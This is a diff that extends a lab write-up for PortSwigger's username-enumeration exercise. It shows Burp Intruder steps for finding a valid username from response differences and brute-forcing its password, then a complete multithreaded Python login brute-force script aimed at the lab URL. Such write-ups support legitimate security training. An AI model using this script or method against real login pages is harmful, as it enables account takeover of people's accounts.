@@ -271,3 +271,375 @@ Attackers may submit extremely long passwords.
 - This helps attacker identify valid usernames.
 
 ![Username enumeration via different responses lab](images/image.png)
+
+
+## Step 1: Capture the Login Request
+
+1. Start **Burp Suite** and keep interception/history enabled.
+2. Open the target login page in the browser.
+3. Enter:
+   - Invalid username
+   - Invalid password
+4. Submit the login form.
+
+---
+
+
+## Step 2: Send the Request to Intruder
+
+1. In Burp Suite, go to:
+
+   ```text
+   Proxy > HTTP history
+   ```
+
+2. Find the request:
+
+   ```http
+   POST /login
+   ```
+
+3. Right-click the request.
+4. Select:
+
+   ```text
+   Send to Intruder
+   ```
+![Username enumeration via different responses lab](images/inter.png)
+
+---
+
+## Step 3: Configure Username Payload Position
+
+1. Open the **Intruder** tab.
+2. Go to the **Positions** section.
+3. Burp automatically marks the username parameter like this:
+
+   ```http
+   username=§invalid-username§&password=invalid-password
+   ```
+
+4. Leave the password static for now.
+5. Make sure attack type is:
+
+   ```text
+   Sniper
+   ```
+
+---
+
+## Step 4: Add Username Wordlist
+
+1. Open the **Payloads** tab.
+2. Ensure payload type is:
+
+   ```text
+   Simple list
+   ```
+
+3. Under **Payload configuration**, paste the list of candidate usernames.
+4. Click:
+
+   ```text
+   Start attack
+   ```
+
+---
+
+## Step 5: Identify Valid Username
+
+1. After the attack finishes, observe the:
+
+   ```text
+   Length
+   ```
+
+   column.
+
+2. Sort the results by clicking the column header.
+3. Notice one response is longer than the others.
+
+### Normal Responses
+
+Most responses contain:
+
+```text
+Invalid username
+```
+
+### Different Response
+
+One response contains:
+
+```text
+Incorrect password
+```
+
+This means:
+
+- Username is valid
+- Password is wrong
+
+4. Note the username shown in the **Payload** column.
+
+---
+
+## Step 6: Configure Password Brute Force
+
+1. Close the previous attack window.
+2. Return to the **Intruder** tab.
+3. Click:
+
+   ```text
+   Clear §
+   ```
+
+4. Replace the username with the valid username you discovered.
+5. Add payload markers around the password parameter.
+
+Example:
+
+```http
+username=identified-user&password=§invalid-password§
+```
+
+---
+
+## Step 7: Add Password Wordlist
+
+1. In the **Payloads** tab:
+   - Remove username payloads
+   - Paste candidate passwords
+
+2. Click:
+
+   ```text
+   Start attack
+   ```
+
+---
+![Username enumeration via different responses lab](images/sni.png)
+
+## Step 8: Find the Correct Password
+
+1. After the attack finishes, observe the:
+
+   ```text
+   Status
+   ```
+
+   column.
+
+2. Most responses return:
+
+   ```text
+   200 OK
+   ```
+
+3. One response returns:
+
+   ```text
+   302 Found
+   ```
+
+This usually indicates:
+
+- Successful login
+- Correct password found
+
+4. Note the password from the **Payload** column.
+
+---
+
+## Step 9: Login to the Application
+
+1. Go back to the login page.
+2. Enter:
+   - Valid username
+   - Correct password
+
+3. Login successfully.
+4. Open the user account page to solve the lab.
+
+---
+
+# Important Note
+
+It is also possible to brute-force both username and password together using:
+
+```text
+Cluster Bomb Attack
+```
+
+However, identifying a valid username first is usually much faster and more efficient.
+
+![Username enumeration via different responses lab](images/clu.png)
+
+
+# Multithreaded Login Brute Force Script
+
+This Python script automates username and password brute forcing for PortSwigger Web Security Academy labs.
+
+It is especially useful when using Burp Suite Community Edition because Intruder attacks are rate-limited and slow.
+
+The script:
+- Takes username and password files as input
+- Uses multithreading for faster execution
+- Displays a live loading animation
+- Shows total attempts and elapsed time
+- Stops automatically when valid credentials are found
+
+---
+
+# Python Script
+
+```python
+import requests
+import threading
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+url = "https://0ac800f404e35a518031c67c00140053.web-security-academy.net/login"
+
+session_cookie = "mI76qzVjMKQIT5CxKng8jxRQ4MTjN"
+
+username_file = input("Username file: ")
+password_file = input("Password file: ")
+
+headers = {
+    "User-Agent": "Mozilla/5.0"
+}
+
+cookies = {
+    "session": session_cookie
+}
+
+with open(username_file, encoding="latin-1") as f:
+    usernames = [u.strip() for u in f]
+
+with open(password_file, encoding="latin-1") as f:
+    passwords = [p.strip() for p in f]
+
+found = False
+attempts = 0
+start_time = time.time()
+
+def loading():
+
+    animation = ["|", "/", "-", "\\"]
+
+    i = 0
+
+    while not found:
+
+        elapsed = round(time.time() - start_time, 1)
+
+        print(
+            f"\r{animation[i % 4]} Running... "
+            f"Attempts: {attempts} | "
+            f"Time: {elapsed}s",
+            end=""
+        )
+
+        time.sleep(0.2)
+
+        i += 1
+
+def login_attempt(username, password):
+
+    global found
+    global attempts
+
+    if found:
+        return
+
+    attempts += 1
+
+    data = {
+        "username": username,
+        "password": password
+    }
+
+    try:
+
+        r = requests.post(
+            url,
+            data=data,
+            headers=headers,
+            cookies=cookies,
+            allow_redirects=False,
+            timeout=3
+        )
+
+        if r.status_code == 302:
+
+            found = True
+
+            print("\n\n===================================")
+            print("USERNAME =", username)
+            print("PASSWORD =", password)
+            print("===================================")
+
+    except:
+        pass
+
+threading.Thread(target=loading, daemon=True).start()
+
+with ThreadPoolExecutor(max_workers=100) as executor:
+
+    for username in usernames:
+
+        for password in passwords:
+
+            if found:
+                executor.shutdown(wait=False)
+                break
+
+            executor.submit(
+                login_attempt,
+                username,
+                password
+            )
+
+print("\nFinished.")
+```
+# Install Required Module
+
+```bash
+pip install requests
+```
+
+# Save Script
+
+```bash
+nano bruteforce.py
+```
+
+Paste the script and save the file.
+
+# Run Script
+
+```bash
+python3 bruteforce.py
+```
+
+#  Input
+
+```text
+Username file: usernames.txt
+Password file: passwords.txt
+```
+
+# Output
+![Username enumeration via different responses lab](images/out.png)
+
+# Features
+
+- Multithreaded login attempts
+- Faster than Burp Suite Community Intruder
+- Live status indicator
+- Displays elapsed time
+- Stops automatically after finding valid credentials
+
+---
+
